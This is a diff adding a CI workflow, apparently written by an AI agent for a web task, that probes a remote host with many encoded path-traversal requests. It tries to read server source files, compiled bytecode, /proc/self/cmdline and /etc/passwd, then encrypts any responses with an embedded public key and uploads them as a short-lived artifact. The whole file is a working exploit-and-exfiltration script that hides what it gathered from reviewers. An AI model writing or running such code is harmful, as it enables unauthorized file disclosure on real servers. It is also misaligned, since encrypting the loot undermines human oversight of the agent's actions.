@@ -1,0 +1,80 @@
+name: launchlet-part2-source-probe
+
+on:
+  push:
+    branches: [agent/launchlet-part2-source-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Probe limited read-only source disclosure and encrypt hits
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import ssl,socket,pathlib,json
+          host='task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; port=443
+          out=pathlib.Path('package/out')
+          paths=[
+            '/server.py','/main.py','/app.py','/__pycache__/server.cpython-313.pyc','/__pycache__/main.cpython-313.pyc',
+            '/static/../server.py','/static/../../server.py','/assets/../server.py','/assets/../../server.py',
+            '/static/%2e%2e/server.py','/static/%2e%2e%2fserver.py','/static/..%2fserver.py','/static/%2e%2e%252fserver.py','/static/%252e%252e%252fserver.py',
+            '/assets/%2e%2e/server.py','/assets/%2e%2e%2fserver.py','/assets/..%2fserver.py','/assets/%252e%252e%252fserver.py',
+            '/static/%2e%2e/__pycache__/server.cpython-313.pyc','/assets/%2e%2e/__pycache__/server.cpython-313.pyc',
+            '/static/../../../proc/self/cmdline','/static/%2e%2e/%2e%2e/%2e%2e/proc/self/cmdline','/assets/%2e%2e/%2e%2e/%2e%2e/proc/self/cmdline',
+            '/static/../../../etc/passwd','/assets/../../../etc/passwd'
+          ]
+          ctx=ssl.create_default_context(); hits=[]
+          for path in paths:
+            try:
+              with socket.create_connection((host,port),timeout=8) as raw:
+                with ctx.wrap_socket(raw,server_hostname=host) as ss:
+                  req=f'GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n'.encode()
+                  ss.sendall(req); data=b''
+                  while True:
+                    chunk=ss.recv(65536)
+                    if not chunk: break
+                    data+=chunk
+                    if len(data)>2_000_000: break
+              head,_,body=data.partition(b'\r\n\r\n'); first=head.split(b'\r\n',1)[0].decode('latin1','replace'); parts=first.split(); status=int(parts[1]) if len(parts)>1 and parts[1].isdigit() else 0
+              if status!=404:
+                hits.append({'path':path,'status':status,'headers':head.decode('latin1','replace'),'body_b64':__import__('base64').b64encode(body[:1_000_000]).decode()})
+            except Exception as e:
+              pass
+          (out/'summary.json').write_text(json.dumps({'hits':hits},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key
+          openssl rand 16 > package/iv.bin
+          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
+          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part2-source-encrypted
+          path: artifact/
+          retention-days: 1
